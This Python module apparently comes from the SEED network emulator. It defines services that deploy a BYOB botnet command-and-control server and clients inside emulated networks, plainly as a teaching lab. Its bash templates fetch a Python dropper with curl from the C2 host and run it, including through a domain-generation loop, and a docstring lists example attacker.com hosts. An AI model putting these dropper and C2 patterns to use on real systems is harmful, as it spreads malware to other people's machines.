#!/usr/bin/env python3
# encoding: utf-8
# __author__ = 'Demon'
from __future__ import annotations
from seedemu.core import Node, Service, Server, Emulator
from typing import Dict

BYOB_VERSION = 'b4946908b8a3691f75a7e15ffe6883ef509afc91'

BotnetServerFileTemplates: Dict[str, str] = {}

BotnetServerFileTemplates['client_dropper_runner'] = '''\
#!/bin/bash
url="http://$1:$2/clients/droppers/client.py"
until curl -sHf "$url" -o client.py > /dev/null; do {
    echo "botnet-client: server $1:$2 not ready, waiting..."
    sleep 1
}; done
echo "botnet-client: server ready!"
python3 client.py &
'''

BotnetServerFileTemplates['client_dropper_runner_dga'] = '''\
#!/bin/bash
chmod +x /dga
while true; do {
    host="`/dga | shuf -n1`"
    echo "botnet-client: dga: trying $host..."
    url="http://$host/clients/droppers/client.py"
    curl -sHf "$url" -o client.py && {
        echo "botnet-client: dga: $host works!"
        python3 client.py
    }
    sleep 1
}; done
'''

BotnetServerFileTemplates['server_init_script'] = '''\
#!/bin/bash
cd /tmp/byob/byob
echo -e 'exit\\ny' | python3 server.py --port $2
python3 client.py --name 'client' $1 $2
'''

BotnetServerFileTemplates['start-byob-shell'] = '''\
#!/bin/bash
cd /tmp/byob/byob
python3 server.py --port {}
'''

BotnetServerFileTemplates['requirements_override'] = '''\
# py-cryptonight
# git+https://github.com/jtgrassie/pyrx.git#egg=pyrx

mss==5.0.0;python_version>'3'
WMI==1.4.9;python_version>'3'
numpy;python_version>'3'
pyxhook==1.0.0;python_version>'3'
twilio==6.35.4;python_version>'3'
colorama==0.4.3;python_version>'3'
requests==2.22.0;python_version>'3'
PyInstaller;python_version>'3'
pycryptodome==3.9.6;python_version>'3'
pycrypto==2.6.1;python_version>'3'

mss==3.3.0;python_version<'3'
WMI==1.4.9;python_version<'3'
numpy==1.15.2;python_version<'3'
pyxhook==1.0.0;python_version<'3'
twilio==6.14.0;python_version<'3'
colorama==0.3.9;python_version<'3'
requests==2.20.0;python_version<'3'
PyInstaller==3.6;python_version<'3'
pycryptodomex==3.8.1;python_version<'3'

opencv-python==3.4.3.18;python_version<'3'

pyHook==1.5.1;sys.platform=='win32'
pypiwin32==223;sys.platform=='win32'
'''


class BotnetServer(Server):
    """!
    @brief The BotnetServer class.
    """

    __port: int
    __files: Dict[str, str]

    def __init__(self):
        """!
        @brief BotnetServer constructor.
        """
        super().__init__()
        self.__port = 445
        self.__files = {}

    def setPort(self, port: int) -> BotnetServer:
        """!
        @brief Set BYOB port. Default to 445.

        Beside the given port, the follow ports will also be opened:
        port + 1: HTTP server hosting BYOB modules (for client to import)
        port + 2: HTTP server host Python packages (for client to import)
        port + 3: HTTP server for incoming uploads.

        @param port port.

        @returns self, for chaining API calls.
        """
        self.__port = port
        return self

    def addFile(self, content: str, path: str):
        """!
        @deprecated to be removed in future version. use
        emulator.getVirtualNode(nodename).setFile instead.

        @brief Add a file to the C2 server. You can use this API to add files
        onto the physical node of the C2 server. This can be useful for
        preparing attack scripts for uploading to the client.

        @param content file content.
        @param path full file path. (ex: /tmp/ddos.py)

        @returns self, for chaining API calls.
        """
        
        self.__files[path] = content

        return self

    def install(self, node: Node):
        """!
        @brief Install the Botnet C2 server.
        """
        address = str(node.getInterfaces()[0].getAddress())

        # add user files
        for (path, body) in self.__files.items():
            node.setFile(path, body)

        # get byob & its dependencies
        node.addSoftware('python3 git cmake python3-dev gcc g++ make python3-pip') 
        node.addBuildCommand('git clone https://github.com/malwaredllc/byob.git /tmp/byob/')
        node.addBuildCommand('git -C /tmp/byob/ checkout {}'.format(BYOB_VERSION)) # server_patch is tested only for this commit
        
        # override requirements
        node.addBuildCommand("mkdir -p /tmp/byob/byob")
        node.addBuildCommand(
            "cat > /tmp/byob/byob/requirements.txt <<'EOF'\n"
            + BotnetServerFileTemplates['requirements_override'] +
            "\nEOF"
        )
        node.addBuildCommand('pip3 install -r /tmp/byob/byob/requirements.txt')

        # use regex rewrite the function body of public_ip()/geolocation()
        node.addBuildCommand(
            "python3 - <<'PY'\n"
            "import re, pathlib\n"
            "root = pathlib.Path('/tmp/byob')\n"
            "targets = ['byob/core/util.py','byob/modules/util.py']\n"
            "for rel in targets:\n"
            "    p = root / rel\n"
            "    s = p.read_text(encoding='utf-8')\n"
            "    s = re.sub(r'def\\s+public_ip\\s*\\(\\)\\s*:[\\s\\S]*?(?=\\n\\s*def\\s|\\Z)',\n"
            "               'def public_ip():\\n"
            "    \"\"\"Return public IP address of host machine\"\"\"\\n"
            "    return local_ip()\\n\\n', s)\n"
            "    s = re.sub(r'def\\s+geolocation\\s*\\(\\)\\s*:[\\s\\S]*?(?=\\n\\s*def\\s|\\Z)',\n"
            "               'def geolocation():\\n"
            "    \"\"\"Return latitude/longitude of host machine (tuple)\"\"\"\\n"
            "    return (\"0\", \"0\")\\n\\n', s)\n"
            "    p.write_text(s, encoding='utf-8')\n"
            "print('byob util.py patched (version-agnostic)')\n"
            "PY"
        )

        # add the init script to server
        node.setFile('/tmp/byob_server_init_script', BotnetServerFileTemplates['server_init_script'])
        node.appendStartCommand('chmod +x /tmp/byob_server_init_script')

        # start the server & make dropper/stager/payload
        node.appendStartCommand('/tmp/byob_server_init_script "{}" "{}"'.format(address, self.__port))

        # script to start byob shell on correct port
        node.setFile('/bin/start-byob-shell', BotnetServerFileTemplates['start-byob-shell'].format(self.__port))
        node.appendStartCommand('chmod +x /bin/start-byob-shell')

        # set attributes for client to find us
        node.setAttribute('botnet_addr', address)
        node.setAttribute('botnet_port', self.__port + 1)
         
    def print(self, indent: int) -> str:
        out = ' ' * indent
        out += 'BotnetServer'

        return out

class BotnetClientServer(Server):
    """!
    @brief The BotnetClientServer class.
    """

    __server: str
    __dga: str
    __emulator: Emulator

    def __init__(self):
        """!
        @brief BotnetClient constructor.
        """
        super().__init__()
        self.__server = None
        self.__port = 446
        self.__dga = None

    def useBindingFrom(self, emulator: Emulator):
        """!
        @brief set the emulator for the client to look for server from.

        note: to be called by the render process. 

        @param emulator emulator.
        """
        self.__emulator = emulator

    def setServer(self, server: str) -> BotnetClientServer:
        """!
        @brief BotnetClient constructor.

        @param server name of the BYOB server virtual node.

        @returns self, for chaining API calls.
        """
        self.__server = server

        return self

    def setDga(self, dgaScript: str) -> BotnetClientServer:
        """!
        @brief set script for generating domain names. 

        The script will be executed to get a "server:port" list, one server each
        line. The script can be anything - bash, python, perl (may need
        addSoftware('perl')), etc. The script should have the correct shebang
        interpreter directive at the beginning.

        Example output:

        abcd.attacker.com:446
        1234.attacker.com:446
        zzzz.attacker.com:446

        If DGA is used, server configured in setServer will be ignored. To
        disable DGA, do setDga(None).

        @param dgaScript content of DGA script, or None to disable DGA.

        @returns self, for chaining API calls.
        """
        self.__dga = dgaScript

        return self

    def install(self, node: Node):
        assert self.__server != None or self.__dga != None, 'botnet-client on as{}/{} has no server configured!'.format(node.getAsn(), node.getName())

        # get byob dependencies.
        node.addSoftware('python3 git cmake python3-dev gcc g++ make python3-pip') 
        
        node.addBuildCommand(
            "cat > /tmp/byob-requirements.txt <<'EOF'\n"
            + BotnetServerFileTemplates['requirements_override'] +
            "\nEOF"
        )
        node.addBuildCommand('pip3 install -r /tmp/byob-requirements.txt')

        fork = False

        # script to get dropper from server.
        if self.__dga == None:
            node.setFile('/tmp/byob_client_dropper_runner', BotnetServerFileTemplates['client_dropper_runner'])
        else:
            fork = True
            node.setFile('/dga', self.__dga)
            node.setFile('/tmp/byob_client_dropper_runner', BotnetServerFileTemplates['client_dropper_runner_dga'])

        server: Node = self.__emulator.getBindingFor(self.__server)

        addr = server.getAttribute('botnet_addr', None)
        port = server.getAttribute('botnet_port', None)

        assert addr != None and port != None, 'cannot find server details from botnet controller the node on {} (as{}/{}). is botnet controller installed on it?'.format(self.__server, server.getAsn(), server.getName())

        # get and run dropper from server.
        node.appendStartCommand('chmod +x /tmp/byob_client_dropper_runner')
        node.appendStartCommand('/tmp/byob_client_dropper_runner "{}" "{}"'.format(addr, port), fork)

    def print(self, indent: int) -> str:
        out = ' ' * indent
        out += 'BotnetClient'

        return out

class BotnetService(Service):
    """!
    @brief Botnet C2 server service.
    """

    def __init__(self):
        """!
        @brief BotnetService constructor.
        """
        super().__init__()
        self.addDependency('Base', False, False)

    def _createServer(self) -> Server:
        return BotnetServer()

    def getName(self) -> str:
        return 'BotnetService'

    def print(self, indent: int) -> str:
        out = ' ' * indent
        out += 'BotnetServiceLayer\n'

class BotnetClientService(Service):
    """!
    @brief Botnet client service.
    """

    __emulator: Emulator

    def __init__(self):
        """!
        @brief BotnetService constructor.
        """
        super().__init__()
        self.addDependency('Base', False, False)

    def _doConfigure(self, node: Node, server: Server):
        server.useBindingFrom(self.__emulator)

    def configure(self, emulator: Emulator):
        self.__emulator = emulator
        return super().configure(emulator)

    def _createServer(self) -> Server:
        return BotnetClientServer()

    def getName(self) -> str:
        return 'BotnetClientService'

    def print(self, indent: int) -> str:
        out = ' ' * indent
        out += 'BotnetClientServiceLayer\n'